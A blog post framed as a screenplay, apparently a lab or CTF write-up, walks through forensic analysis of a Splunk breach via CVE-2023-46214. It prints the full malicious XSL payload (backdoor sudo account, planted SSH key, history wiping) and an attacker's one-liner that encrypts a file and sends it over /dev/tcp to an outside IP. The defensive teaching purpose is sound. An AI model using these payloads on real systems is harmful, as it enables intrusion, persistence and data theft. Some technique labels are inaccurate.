---
title: "Incident Response"
date: 2024-10-25T13:43:53-06:00
draft: false
image: brand_image.jpg
tags: ["Wireshark", "Openssl"]
series: "Hunting the hunter"
---

- Reading time : "16 min read"

# GETI City Cyber Crisis

## Episode 1: The Breach

---

> _In the heart of Golang Country stands GETI City - a metropolis where technology and ambition touch the sky..._

---

### Scene 1: The City

The winter wind howls through GETI City's glass-and-steel canyons, carrying whispers of digital secrets between towering skyscrapers. Neon signs pierce the darkness, their glow reflecting off the frost-covered windows of Brukley Company's cybersecurity headquarters.

---

### Scene 2: The Alert

```
[CRITICAL ALERT]
Time: 23:47
Location: Brukley Company SOC
Status: ⚠️ SECURITY BREACH DETECTED ⚠️
```

---

### Scene 3: The SOC Room

_The Security Operations Center thrums with tension. Rows of monitors cast an eerie blue glow across worried faces. In the corner, John's workspace has become the epicenter of chaos._

**John** [hands trembling over keyboard]:  
"This isn't normal... The file just... disappeared. Like it was never there."

**Team** [gathering around]:  
_The soft whir of cooling fans is the only sound as they watch John's screen in horrified silence._

---

### Scene 4: The Discovery

**Thomas** [leaning forward, squinting]:  
"Wait. That account... it wasn't there five minutes ago."  
_His finger traces across the screen, pointing to a username that shouldn't exist._

**John**:  
"How did we miss this?"

---

### Scene 5: The Response

**Marcos** [commanding presence, SOC team leader]:  
"Listen up! I want:

- Full network captures
- System logs from the last 48 hours
- Memory dumps from John's machine
- All access logs from the authentication servers

We're not losing this trail."

---

### Scene 6: The Investigation

_Montage sequence:_

- Screens fill with scrolling logs
- USB drives blink frantically
- Network cables snake across desks
- Commands fly across terminals
- Coffee cups multiply

---

### Scene 7: The Call for Help

_The team exchanges knowing looks. There's only one person who can unravel this digital nightmare..._

---

### Scene 8: Enter **Monaquimbamba**

_The SOC room door hisses open. A figure stands in the doorway, silhouetted against the hallway lights. Her custom-built laptop glows with a soft, dangerous light._

**Monaquimbamba** [stepping into the light]:  
"Show me what you've got. And someone better have decent coffee."

_Her fingers hover over her keyboard like a pianist about to begin a symphony of code._

---

## Episode 2: Digital Breadcrumbs

---

### Scene 1: The Analysis Begins

_The SOC room has transformed into Monaquimbamba's temporary command center. Multiple monitors surround her, each reflecting the blue glow of packet analysis tools._

```
[Network Capture Stats]
Total Packets: 1,427
Time Range: 22:45:16 - 23:47:32
Capture Size: 2.3 MB
```

---

### Scene 2: The Hunt

_Monaquimbamba's fingers dance across her mechanical keyboard, the clicking sounds rhythmic and purposeful._

**Monaquimbamba** [muttering to herself]:  
"Let's see what stories these packets can tell..."

_She types her first filter command:_

```wireshark
http || https
```

---

### Scene 3: The Discovery

_The screen refreshes, packets reorganizing themselves like digital playing cards._

**John** [watching over her shoulder]:  
"Thirty packets... out of more than fourteen hundred?"

**Monaquimbamba**:  
"Sometimes the smallest anomalies tell the biggest stories."

---

### Scene 4: The Splunk Connection

_Monaquimbamba leans forward, her eyes narrowing at a particular sequence of packets._

**Monaquimbamba** [to herself]:  
"The Splunk web UI connection... something's not right here."

---

### Scene 5: The Pattern

_Multiple screens show different aspects of the same traffic pattern. Monaquimbamba's face is illuminated by the data scrolling past._

**Marcos**:  
"What are you seeing?"

**Monaquimbamba** [highlighting sections of the capture]:  
"These request patterns... they're identical to..."
_Her voice trails off as she furiously types._

---

### Scene 6: The Revelation

_The room falls silent as the implications sink in._

```
POST /en-US/splunkd/__upload/indexing/preview?output_mode=json&props.NO_BINARY_CHECK=1&input.path=search.xsl HTTP/1.1
Host: ubuntu:8000
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/119.0
Accept-Encoding: gzip, deflate, br
Accept: text/javascript, text/html, application/xml, text/xml, */*
Connection: keep-alive
X-Requested-With: XMLHttpRequest
X-Splunk-Form-Key: 7329280097253260706
Cookie: splunkd_8000=Qwwd^Wsu1LKIQ1wyhHD39Xh1hhVVVKhcBpjhRad2F4izvjbE9MV658229L3Y_DiEzPgBw5f^ZzybEUBBnOgjDZNxniMCUm4YdpAeQ2mnRgzNuA8JJ5qHZUsjDcOrrmiYnRaCnqY; splunkweb_csrf_token_8000=7329280097253260706; session_id_8000=df3ea150f1987e9303605bbaa9a30fae85cc6fbe
Content-Length: 1559
Content-Type: multipart/form-data; boundary=701f565ce8c744fcd96cd368909b966e


Content-Disposition: form-data; name="spl-file"; filename="search.xsl"
Content-Type: application/xslt+xml

<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:exsl="http://exslt.org/common" extension-element-prefixes="exsl">
  <xsl:template match="/">
    <exsl:document href="/opt/splunk/bin/scripts/search.sh" method="text">
        <xsl:text>#!/bin/bash&#10;adduser --shell /bin/bash --gecos nginx --quiet --disabled-password --home /var/www/ nginx&#10;access=$(echo MzlhNmJiZTY0NTYzLTY3MDktOTNhNC1hOWYzLTJjZTc4Mjhm | base64 -d | rev)&#10;echo &quot;nginx:$access&quot; | chpasswd&#10;usermod -aG sudo nginx&#10;mkdir /var/www/.ssh&#10;echo &quot;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDKoougbBG5oQuAQWW2JcHY/ZN49jmeegLqgVlimxv42SfFXcuRgUoyostBB6HnHB5lKxjrBmG/183q1AWn6HBmHpbzjZZqKwSfKgap34COp9b+E9oIgsu12lA1I7TpOw1S6AE71d4iPj5pFFxpUbSG7zJaQ2CAh1qK/0RXioZYbEGYDKVQc7ivd1TBvt0puoogWxllsCUTlJxyQXg2OcDA/8enLh+8UFKIvZy4Ylr4zNY4DyHmwVDL06hcjTfCP4T/JWHf8ShEld15gjuF1hZXOuQY4qwit/oYRN789mq2Ke+Azp0wEo/wTNHeY9OSQOn04zGQH/bLfnjJuq1KQYUUHRCE1CXjUt4cxazQHnNeVWlGOn5Dklb/CwkIcarX4cYQM36rqMusTPPvaGmIbcWiXw9J3ax/QB2DR3dF31znW4g5vHjYYrFeKmcZU1+DCUx075nJEVjy+QDTMQvRXW9Jev6OApHVLZc6Lx8nNm8c6X6s4qBSu8EcLLWYFWIwxqE= support@nginx.org&quot; &gt; /var/www/.ssh/authorized_keys&#10;chown -R nginx:nginx /var/www/&#10;cat /dev/null &gt; /root/.bash_history</xsl:text>
    </exsl:document>
  </xsl:template>
</xsl:stylesheet>
```

**Monaquimbamba** [grimly]:  
"This exploit allows attackers to execute arbitrary commands through the Splunk web interface. Someone knew exactly what they were doing."

**Thomas** [pointing at the screen]:  
"That's exactly when my security alerts started firing!"

---

### Scene 7: The Evidence

_Monaquimbamba pulls up multiple windows, creating a timeline of the attack:_

#### Step 1: Login

The exploitation process begins with sending a login HTTP `POST` request. The attacker requires user credentials to proceed.

```bash
POST /en-US/account/login HTTP/1.1
Host: ubuntu:8000
User-Agent: python-requests/2.31.0
Accept-Encoding: gzip, deflate, br
Accept: */*
Connection: keep-alive
Content-Length: 78
Content-Type: application/x-www-form-urlencoded

username=johnnyC&password=h3Re15j0hnNy&set_has_logged_in=false
```

#### Step 2: Upload Malicious XSL File

After login, the attacker uploads a malicious `XSL file`, the main payload for this exploit:

```bash
POST /en-US/splunkd/__upload/indexing/preview?output_mode=json&props.NO_BINARY_CHECK=1&input.path=search.xsl HTTP/1.1
Host: ubuntu:8000
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/119.0
Accept-Encoding: gzip, deflate, br
Accept: application/xml, */*
Connection: keep-alive
X-Splunk-Form-Key: 7329280097253260706
Cookie: splunkd_8000=Qwwd^Wsu1LKIQ1wyhHD39Xh1hhVVVKhcBpjhRad2F4izvjbE9MV658229L3Y_DiEzPgBw5f^ZzybEUBBnOgjDZNxniMCUm4YdpAeQ2mnRgzNuA8JJ5qHZUsjDcOrrmiYnRaCnqY; splunkweb_csrf_token_8000=7329280097253260706
Content-Length: 1559
Content-Type: multipart/form-data; boundary=701f565ce8c744fcd96cd368909b966e

Content-Disposition: form-data; name="spl-file"; filename="search.xsl"
Content-Type: application/xslt+xml
```

#### Step 3: Malicious Code in XSL File

The XSL file uploads a payload with the following commands:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:exsl="http://exslt.org/common" extension-element-prefixes="exsl">
  <xsl:template match="/">
    <exsl:document href="/opt/splunk/bin/scripts/search.sh" method="text">
        <xsl:text>#!/bin/bash
adduser --shell /bin/bash --gecos nginx --quiet --disabled-password --home /var/www/ nginx
access=$(echo MzlhNmJiZTY0NTYzLTY3MDktOTNhNC1hOWYzLTJjZTc4Mjhm | base64 -d | rev)
echo "nginx:$access" | chpasswd
usermod -aG sudo nginx
mkdir /var/www/.ssh
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDKoougbBG5oQuAQWW2JcHY/ZN49jmeegLqgVlimxv42SfFXcuRgUoyostBB6HnHB5lKxjrBmG/183q1AWn6HBmHpbzjZZqKwSfKgap34COp9b+E9oIgsu12lA1I7TpOw1S6AE71d4iPj5pFFxpUbSG7zJaQ2CAh1qK/0RXioZYbEGYDKVQc7ivd1TBvt0puoogWxllsCUTlJxyQXg2OcDA/8enLh+8UFKIvZy4Ylr4zNY4DyHmwVDL06hcjTfCP4T/JWHf8ShEld15gjuF1hZXOuQY4qwit/oYRN789mq2Ke+Azp0wEo/wTNHeY9OSQOn04zGQH/bLfnjJuq1KQYUUHRCE1CXjUt4cxazQHnNeVWlGOn5Dklb/CwkIcarX4cYQM36rqMusTPPvaGmIbcWiXw9J3ax/QB2DR3dF31znW4g5vHjYYrFeKmcZU1+DCUx075nJEVjy+QDTMQvRXW9Jev6OApHVLZc6Lx8nNm8c6X6s4qBSu8EcLLWYFWIwxqE= support@nginx.org" > /var/www/.ssh/authorized_keys
chown -R nginx:nginx /var/www/
cat /dev/null > /root/.bash_history</xsl:text>
    </exsl:document>
  </xsl:template>
</xsl:stylesheet>
```

#### Explanation of the Malicious Code

- **Add User**: Adds a new user named `nginx` with a home directory of `/var/www/`.
- **Set Password**: Decodes and reverses a base64 password.
  ```bash
  access=$(echo MzlhNmJiZTY0NTYzLTY3MDktOTNhNC1hOWYzLTJjZTc4Mjhm | base64 -d | rev)
  ```
  **Decoded Password**: `f8287ec2-3f9a-4a39-9076-36546ebb6a93`
- **Set SSH Access**: Adds an RSA public key to allow SSH access for the `nginx` user.

#### Step 4: Trigger Code Execution

Once the malicious XSL file is uploaded, the vulnerable code path is accessed using the `getJobAsset` function by calling the job search endpoint with the dispatch ID:

```bash
POST /en-US/splunkd/__raw/servicesNS/johnnyC/search/search/jobs?output_mode=json HTTP/1.1
```

This ultimately allows the attacker to execute arbitrary code and escalate privileges.

This vulnerability has the relevant `MITRE ATT&CK` Techniques for Maintaining Persistence

##### 1. **Create Account (T1136)**

- **Description**: This technique involves an attacker creating a new user account on a compromised system.
- **Example**: An attacker could exploit the vulnerability to create a new account with administrative privileges, granting them ongoing access. This is often achieved via commands that add users with elevated permissions.

##### 2. **SSH Hijacking (T1203)**

- **Description**: By adding an SSH public key to the authorized keys of an existing or newly created user, an attacker can enable remote access without needing a password.
- **Example**: An attacker may inject a script to add their SSH key to a user’s `.ssh/authorized_keys` file, allowing them to maintain remote access independently of the original method of entry.

##### 3. **Account Manipulation (T1098)**

- **Description**: This technique involves modifying account permissions or configurations to retain access.
- **Example**: An attacker might modify an existing account by adding it to the `sudo` group or altering password settings to ensure persistent access.

### Scene 8: The Confirmation

_Monaquimbamba swivels in her chair to face the team._

**Monaquimbamba**:  
"We're dealing with someone who knows their CVEs. They exploited a vulnerability that was just published [Uptycs Blog](https://www.uptycs.com/blog/threat-research-report-team/splunk-vulnerability-cve-2023-46214). But they made one mistake..."

_She turns back to her screen, a slight smile playing at the corner of her mouth._

**Monaquimbamba**:  
"They left breadcrumbs."

---

### Scene 9: The Next Step

_The team clusters around Monaquimbamba's workspace, the tension palpable._

**Marcos**:  
"What do we do now?"

**Monaquimbamba** [reaching for her custom USB drive]:  
"Now? We follow the trail. And I know exactly where it leads..."

---

## Episode 3: The Time Paradox

### Scene 1: The Timeline Puzzle

_The investigation room is quiet except for the soft hum of servers. Multiple screens display log files and system timestamps._

**Monaquimbamba** [scrolling through logs]:  
"Something's not adding up here..."

**Thomas**:  
"What do you see?"

**Monaquimbamba**:  
"The timestamps... they're dancing between two different time zones."

---

### Scene 2: The Discovery

_Monaquimbamba pulls up the `root/var/log/syslog` entries on the main screen, the text reflecting off her glasses._

**Monaquimbamba**:  
"Look at this. The system was originally in Pacific time..."

_She highlights a log entry:_

```bash
Apr 13 23:21:30 ubuntu gnome-shell[4904]: GNOME Shell started at Sat Apr 13 2024 23:21:22 GMT-0700 (PDT)
```

**John** [shifting uncomfortably]:  
"I had to adjust the timezone for better synchronization with the target systems."

**Monaquimbamba**: "What about this one"

```bash
grep -i "timezone" var/log/syslog
```

"The output confirms the timezone was changed:"

```bash
Apr 13 23:24:56 ubuntu dbus-daemon[638]: [system] Activating via systemd: service name='org.freedesktop.timedate1' unit='dbus-org.freedesktop.timedate1.service' requested by ':1.113' (uid=0 pid=5827 comm="timedatectl set-timezone Asia/Ho_Chi_Minh " label="unconfined")
```

---

### Scene 3: The Ripple Effect

_The team examines a complex timeline of events displayed across multiple monitors._

**Marcos**:  
"Ho Chi Minh City timezone... UTC+7. That's a fourteen-hour swing from PDT."

**Monaquimbamba**:  
"And that's exactly what they were counting on. The time disparity created the perfect smoke screen."

---

### Scene 4: The Pattern Emerges

_A visualization appears showing two parallel timelines - one in PDT, one in Asia/Ho_Chi_Minh._

**Monaquimbamba**:  
"They didn't just exploit our systems... they exploited time itself."

**Marcos**:  
"By operating in the gaps between timezone updates..."

**Monaquimbamba** [finishing his thought]:  
"They created their own temporal blind spots. Brilliant and devastating."

---

### Scene 5: The Hunt Continues

_The room glows with the light of dozens of screens, each showing different aspects of the investigation._

**Monaquimbamba**:  
"They thought they could hide in the gaps between seconds, between timezones..."

_She activates her tracking algorithm._

**Monaquimbamba** [with a slight smile]:  
"But time... time always tells the truth."

## Episode 5: The Trail of Breadcrumbs

### Scene 1: The Log Analysis

_Monaquimbamba's workspace is filled with terminal windows displaying `/var/log/auth.log` entries. The soft glow of the screens illuminates her focused expression._

**Monaquimbamba** [scanning through logs]:  
"Three minutes. They were in and out in just three minutes."

_She highlights a timestamp sequence:_

```bash
++Apr 14 08:00:13 ubuntu groupadd[13358]: group added to /etc/group: name=nginx, GID=1002
  Apr 14 08:00:13 ubuntu groupadd[13358]: group added to /etc/gshadow: name=nginx
  Apr 14 08:00:13 ubuntu groupadd[13358]: new group: name=nginx, GID=1002
  Apr 14 08:00:13 ubuntu useradd[13364]: new user: name=nginx, UID=1002, GID=1002, home=/var/www/, shell=/bin/bash, from=none
  Apr 14 08:00:13 ubuntu usermod[13376]: change user 'nginx' password
  Apr 14 08:00:13 ubuntu chfn[13383]: changed user 'nginx' information
  Apr 14 08:00:13 ubuntu chpasswd[13394]: pam_unix(chpasswd:chauthtok): password changed for nginx
  Apr 14 08:00:13 ubuntu chpasswd[13394]: gkr-pam: couldn't update the login keyring password: no old password was entered
  Apr 14 08:00:13 ubuntu usermod[13397]: add 'nginx' to group 'sudo'
  Apr 14 08:00:13 ubuntu usermod[13397]: add 'nginx' to shadow group 'sudo'
  Apr 14 08:00:21 ubuntu sshd[13461]: Accepted publickey for nginx from 192.168.222.130 port 43302 ssh2: RSA SHA256:zRdVnxnRPJ37HDm5KkRvQbklvc2PfFL3av8W1Jb6QoE
  Apr 14 08:00:21 ubuntu sshd[13461]: pam_unix(sshd:session): session opened for user nginx by (uid=0)
  Apr 14 08:00:21 ubuntu systemd-logind[673]: New session 7 of user nginx.
  Apr 14 08:00:22 ubuntu systemd: pam_unix(systemd-user:session): session opened for user nginx by (uid=0)
  Apr 14 08:00:45 ubuntu sudo: pam_unix(sudo:auth): Couldn't open /etc/securetty: No such file or directory
  Apr 14 08:00:54 ubuntu sudo: pam_unix(sudo:auth): Couldn't open /etc/securetty: No such file or directory
  Apr 14 08:00:54 ubuntu sudo: nginx : TTY=pts/2 ; PWD=/opt/splunk/bin/scripts ; USER=root ; COMMAND=/usr/bin/rm -rf search.sh
  Apr 14 08:00:54 ubuntu sudo: pam_unix(sudo:session): session opened for user root by nginx(uid=0)
  Apr 14 08:00:54 ubuntu sudo: pam_unix(sudo:session): session closed for user root
  Apr 14 08:00:59 ubuntu sudo: nginx : TTY=pts/2 ; PWD=/opt/splunk/bin/scripts ; USER=root ; COMMAND=/usr/bin/su
  Apr 14 08:00:59 ubuntu sudo: pam_unix(sudo:session): session opened for user root by nginx(uid=0)
  Apr 14 08:00:59 ubuntu su: (to root) nginx on pts/2
  Apr 14 08:00:59 ubuntu su: pam_unix(su:session): session opened for user root by nginx(uid=0)
  Apr 14 08:01:37 ubuntu pkexec: pam_unix(polkit-1:session): session opened for user root by (uid=1000)
  Apr 14 08:01:37 ubuntu pkexec[14219]: johnnycage: Executing command [USER=root] [TTY=unknown] [CWD=/home/johnnycage] [COMMAND=/usr/lib/update-notifier/package-system-locked]
  Apr 14 08:01:44 ubuntu su: pam_unix(su:session): session closed for user root
  Apr 14 08:01:44 ubuntu sudo: pam_unix(sudo:session): session closed for user root
  Apr 14 08:02:21 ubuntu sudo: nginx : TTY=pts/2 ; PWD=/var/www ; USER=root ; COMMAND=/usr/bin/mv /home/johnnycage/Documents/Important.pdf .
  Apr 14 08:02:21 ubuntu sudo: pam_unix(sudo:session): session opened for user root by nginx(uid=0)
  Apr 14 08:02:21 ubuntu sudo: pam_unix(sudo:session): session closed for user root
  Apr 14 08:02:54 ubuntu sudo: nginx : TTY=pts/2 ; PWD=/var/www ; USER=root ; COMMAND=/usr/bin/openssl enc -aes-256-cbc -iv 4fa17640b7dfe8799f072c65b15f581d -K 3cabc6db78a034f69f16aa8986cf2e2cea05713b1e95ff9b2d80f6a71ae76b7d -in data.zip
  Apr 14 08:02:54 ubuntu sudo: pam_unix(sudo:session): session opened for user root by nginx(uid=0)
  Apr 14 08:02:54 ubuntu sudo: pam_unix(sudo:session): session closed for user root
  Apr 14 08:03:01 ubuntu sudo: nginx : TTY=pts/2 ; PWD=/var/www ; USER=root ; COMMAND=/usr/bin/rm -rf data.zip Important.pdf
  Apr 14 08:03:01 ubuntu sudo: pam_unix(sudo:session): session opened for user root by nginx(uid=0)
  Apr 14 08:03:01 ubuntu sudo: pam_unix(sudo:session): session closed for user root
  Apr 14 08:03:08 ubuntu sshd[13702]: Received disconnect from 192.168.222.130 port 43302:11: disconnected by user
  Apr 14 08:03:08 ubuntu sshd[13702]: Disconnected from user nginx 192.168.222.130 port 43302
  Apr 14 08:03:08 ubuntu sshd[13461]: pam_unix(sshd:session): session closed for user nginx
  Apr 14 08:03:08 ubuntu systemd-logind[673]: Session 7 logged out. Waiting for processes to exit.
++Apr 14 08:03:08 ubuntu systemd-logind[673]: Removed session 7.
```

**Thomas**:
"That's surgical precision."

---

### Scene 2: The Pattern

_Multiple screens show the attacker's activities timeline. Monaquimbamba pieces together the sequence._

**Monaquimbamba**:
"Watch how they moved..."

_She brings up key log entries:_

#### Time Elapsed Between Actions

To calculate the time between the user’s creation and the end of the session:

- **User `nginx` Created**: April 14, 08:00:13
- **SSH Session Ended**: April 14, 08:03:08
- **Elapsed Time**: **00:02:55**

Below is a breakdown of key log entries to understand the attacker’s actions:

1. **`Apr 14 08:00:59 ubuntu su: (to root) nginx on pts/2`**
   - **Timestamp**: April 14, 08:00:59
   - **Event**: The user `nginx` is attempting to switch to the `root` user using the `su` command on the terminal session `pts/2`.
   - **Significance**: This indicates that the `nginx` user is trying to gain superuser privileges.
2. **`Apr 14 08:00:59 ubuntu su: pam_unix(su:session): session opened for user root by nginx(uid=0)`**
   - **Event**: A new session has been opened for the `root` user by `nginx`.
   - **Significance**: The attempt to switch to the `root` user was successful. The UID of `nginx` is 0, which typically indicates that the user has administrative privileges.
3. **`Apr 14 08:01:37 ubuntu pkexec: pam_unix(polkit-1:session): session opened for user root by (uid=1000)`**
   - **Timestamp**: April 14, 08:01:37
   - **Event**: A session has been opened for the `root` user by a user with UID 1000 (most likely a non-root user).
   - **Significance**: This indicates that a user (likely `johnnycage`, based on the next line) executed a command that required elevated privileges using `pkexec`.
4. **`Apr 14 08:01:37 ubuntu pkexec[14219]: johnnycage: Executing command [USER=root] [TTY=unknown] [CWD=/home/johnnycage] [COMMAND=/usr/lib/update-notifier/package-system-locked]`**
   - **Event**: The user `johnnycage` executed a command to run the `package-system-locked` script.
   - **Significance**: This indicates that `johnnycage` was trying to perform an action that required root permissions, possibly to notify about package updates.
5. **`Apr 14 08:01:44 ubuntu su: pam_unix(su:session): session closed for user root`**
   - **Event**: The session for the `root` user has been closed.
   - **Significance**: The `nginx` user has finished the session as `root`.
6. **`Apr 14 08:01:44 ubuntu sudo: pam_unix(sudo:session): session closed for user root`**
   - **Event**: Another session for the `root` user, initiated by `sudo`, has been closed.
   - **Significance**: This confirms that the `root` session associated with `sudo` has also ended.
7. **`Apr 14 08:02:21 ubuntu sudo: nginx : TTY=pts/2 ; PWD=/var/www ; USER=root ; COMMAND=/usr/bin/mv /home/johnnycage/Documents/Important.pdf .`**
   - **Timestamp**: April 14, 08:02:21
   - **Event**: The `nginx` user is moving a file named `Important.pdf` from `johnnycage`'s Documents folder to the current directory (`/var/www`).
   - **Significance**: This operation indicates file management, possibly for a web application.
8. **`Apr 14 08:02:21 ubuntu sudo: pam_unix(sudo:session): session opened for user root by nginx(uid=0)`**
   - **Event**: A new session has been opened for the `root` user by `nginx` through `sudo`.
   - **Significance**: The `nginx` user has elevated permissions again.
9. **`Apr 14 08:02:21 ubuntu sudo: pam_unix(sudo:session): session closed for user root`**
   - **Event**: The session for the `root` user has been closed.
   - **Significance**: Indicates that the operation initiated by `nginx` has been completed.
10. **`Apr 14 08:02:54 ubuntu sudo: nginx : TTY=pts/2 ; PWD=/var/www ; USER=root ; COMMAND=/usr/bin/openssl enc -aes-256-cbc -iv 4fa17640b7dfe8799f072c65b15f581d -K 3cabc6db78a034f69f16aa8986cf2e2cea05713b1e95ff9b2d80f6a71ae76b7d -in data.zip`**
    - **Timestamp**: April 14, 08:02:54
    - **Event**: The `nginx` user is using `openssl` to encrypt a file (`data.zip`) with AES-256-CBC.
    - **Significance**: This operation suggests that the `nginx` user is encrypting sensitive data.
11. **`Apr 14 08:02:54 ubuntu sudo: pam_unix(sudo:session): session opened for user root by nginx(uid=0)`**
    - **Event**: A new session has been opened for the `root` user by `nginx` for this command.
    - **Significance**: Indicates that `nginx` is performing operations with root privileges again.
12. **`Apr 14 08:02:54 ubuntu sudo: pam_unix(sudo:session): session closed for user root`**
    - **Event**: The session for the `root` user has been closed.
    - **Significance**: This indicates the completion of the encryption command.
13. **`Apr 14 08:03:01 ubuntu sudo: nginx : TTY=pts/2 ; PWD=/var/www ; USER=root ; COMMAND=/usr/bin/rm -rf data.zip Important.pdf`**
    - **Timestamp**: April 14, 08:03:01
    - **Event**: The `nginx` user is removing the original `data.zip` and `Important.pdf` files.
    - **Significance**: This suggests an attempt to cover tracks or remove sensitive files after processing.

**Marcos**:
"They knew exactly what they were after."

**Monaquimbamba**: "we can trace when the attacker connected via SSH. To do this, we examine log entries related to the `sshd` service"

```bash
cat auth.log | grep -i "sshd"
```

**Sample Output**:

```bash
Apr 14 07:58:34 ubuntu useradd[11091]: new user: name=sshd, UID=126, GID=65534, home=/run/sshd, shell=/usr/sbin/nologin, from=none
Apr 14 07:58:34 ubuntu usermod[11099]: change user 'sshd' password
Apr 14 07:58:34 ubuntu chage[11106]: changed password expiry for sshd
Apr 14 08:00:21 ubuntu sshd[13461]: Accepted publickey for nginx from 192.168.222.130 port 43302 ssh2: RSA SHA256:zRdVnxnRPJ37HDm5KkRvQbklvc2PfFL3av8W1Jb6QoE
Apr 14 08:00:21 ubuntu sshd[13461]: pam_unix(sshd:session): session opened for user nginx by (uid=0)
Apr 14 08:03:08 ubuntu sshd[13702]: Received disconnect from 192.168.222.130 port 43302:11: disconnected by user
```

Knowing the timezone, we can convert connection timestamps to UTC.

### Connection Timestamps

- **Original Date and Time**: April 14, 2024, at 08:00:21 PDT
- **Converted to UTC**: April 14, 2024, at 15:00:21 UTC
  The final timestamp in `MM-DD hh:mm:ss` format is:
  **`04-14 15:00:21`**

---

### Scene 3: The Command History

_Monaquimbamba opens a new terminal window, displaying the contents of `.bash_history` file located in `/var/www/`_

**Monaquimbamba**:  
"Found their footprints."

_She projects the command history:_

```bash
whoami
cd /opt/splunk/bin/scripts/
sudo rm -rf search.sh
sudo su
cd /home/johnnycage/
sudo mv /home/johnnycage/Documents/Important.pdf .
zip data.zip *
sudo openssl enc -aes-256-cbc -iv $(cut -c 1-32 <<< $(uname -r | md5sum)) -K $(cut -c 1-64 <<< $(date +%s | sha256sum)) -in data.zip | base64 | dd conv=ebcdic > /dev/tcp/192.168.222.130/8080
sudo rm -rf *
```

**Thomas**:  
"Classic reconnaissance pattern."

**Monaquimbamba** [eyes widening]:  
"This is beautiful... in a terrifying way."

```bash
sudo openssl enc -aes-256-cbc \
-iv $(cut -c 1-32 <<< $(uname -r | md5sum)) \
-K $(cut -c 1-64 <<< $(date +%s | sha256sum))
```

**John**:  
"They're using system properties to generate their keys?"

**Monaquimbamba**:  
"The kernel version for the IV... system time for the key..."

**Marcos** [pointing]:  
"Look at their movement pattern..."

**Monaquimbamba**:  
"They went straight for johnnycage's documents. Just like we saw in the logs."

**John**:  
"They encrypted something called `data.zip`..."

**Monaquimbamba** :
"From the `.bash_history` and `auth.log`, we observe that the attacker:"

1. Accessed elevated privileges using `su` and `sudo`.
2. Moved, encrypted, and attempted to exfiltrate `Important.pdf` to an external server.
3. Cleaned up evidence using `rm` commands on sensitive files.

Finally, using the known `iv` and `key` from point 10 in the logs:

```plaintext
iv 4fa17640b7dfe8799f072c65b15f581d
-K 3cabc6db78a034f69f16aa8986cf2e2cea05713b1e95ff9b2d80f6a71ae76b7d
```

---

### Scene 4: The Exfiltration Route

_A network diagram appears, showing the data's path._

**Monaquimbamba**:  
"The final destination: `192.168.222.130`, port `8080`."

**Thomas**:  
"And they encoded it three times - encryption, `base64`, and `EBCDIC`."

**Monaquimbamba**:  
"Like nesting dolls of obfuscation."

**Marcos**:  
"A perfectly choreographed attack."

**Monaquimbamba**: "Let's put this all together"

The following command line demonstrates a multi-step operation using several tools—`openssl`, `cut`, `uname`, `md5sum`, `sha256sum`, `date`, `base64`, and `dd`. Here’s a detailed breakdown:

```bash
sudo openssl enc -aes-256-cbc -iv $(cut -c 1-32 <<< $(uname -r | md5sum)) -K $(cut -c 1-64 <<< $(date +%s | sha256sum)) -in data.zip | base64 | dd conv=ebcdic > /dev/tcp/192.168.222.130/8080
```

#### Explanation of Each Step

1. **Superuser Privilege**:

   - `sudo`: Runs the command as a superuser, providing necessary permissions for access and encryption.

2. **Encryption with OpenSSL**:

   - `openssl enc -aes-256-cbc`: Encrypts data using the AES-256 algorithm in CBC (Cipher Block Chaining) mode.
   - `-iv $(cut -c 1-32 <<< $(uname -r | md5sum))`: Generates a 32-character (128-bit) initialization vector (IV) for encryption:
     - `uname -r` outputs the kernel version.
     - `md5sum` hashes this kernel version, creating a unique MD5 hash.
     - `cut -c 1-32` extracts the first 32 characters from this hash, producing the IV.
   - `-K $(cut -c 1-64 <<< $(date +%s | sha256sum))`: Specifies the encryption key:
     - `date +%s` outputs the current Unix timestamp (seconds since January 1, 1970).
     - `sha256sum` hashes the timestamp, creating a unique 64-character SHA-256 hash.
     - `cut -c 1-64` takes the full 64 characters, forming a 256-bit encryption key.
   - `-in data.zip`: Specifies `data.zip` as the input file for encryption.

   The result of this part is encrypted data from `data.zip`.

3. **Encoding to Base64**:

   - `| base64`: The pipe `|` passes the encrypted output from `openssl` to `base64`.
   - `base64`: Encodes the encrypted data into Base64, converting binary data into text to facilitate transmission.

4. **Converting to EBCDIC Encoding**:

   - `| dd conv=ebcdic`: The pipe `|` sends the Base64-encoded data to `dd`.
   - `dd conv=ebcdic`: Converts the data from ASCII (default) encoding to EBCDIC (Extended Binary Coded Decimal Interchange Code), a character encoding system typically used on IBM mainframes.

5. **Transmitting Encrypted Data via TCP**:
   - `> /dev/tcp/192.168.222.130/8080`: Redirects the final encrypted, Base64-encoded, and EBCDIC-encoded data to a TCP connection targeting IP address `192.168.222.130` on port `8080`.

---

### Scene 6: The IP Address

_Monaquimbamba zooms in on the connection details._

**Monaquimbamba**:  
"192.168.222.130 - Our ghost IP address."

_She brings up the SSH connection log:_

```bash
Accepted publickey for nginx from 192.168.222.130 port 43302
```

**Thomas**:  
"we can search network traffic and then recover the file exfiltrated."

---

## Episode 6: Digital Archaeology

### Scene 1: The Network Capture

_Thomas pulls up network traffic logs._

**Thomas**:  
"Got the `EBCDIC-encoded` transmission. Port `8080`, just like in the command."

**Monaquimbamba**:  
"Now we reverse their Russian doll encryption..."

**Monaquimbamba**:  
"This Python script is designed to extract raw TCP data from a pcap file, convert it from EBCDIC to ASCII, decode it from Base64, and decrypt it using OpenSSL."

#### Step 1: Extracting Raw TCP Data

The script below reads packets from a specified pcap file, filters them based on IP and port conditions, orders them by TCP sequence, and then assembles the data in the correct sequence.

```python
from scapy.all import rdpcap, TCP, IP, Raw

def extract_tcp_data(pcap_file):
    """Extracts raw data from TCP packets matching filter conditions"""
    packets = rdpcap(pcap_file)
    assembled_data = b""

    print(f"\nAnalyzing {len(packets)} packets from {pcap_file}...")

    # Sort packets by sequence number to ensure correct order
    data_packets = []
    for packet in packets:
        if (packet.haslayer(TCP) and packet.haslayer(IP) and packet.haslayer(Raw) and
            packet[IP].src == '192.168.222.145' and
            packet[TCP].sport == 36568 and
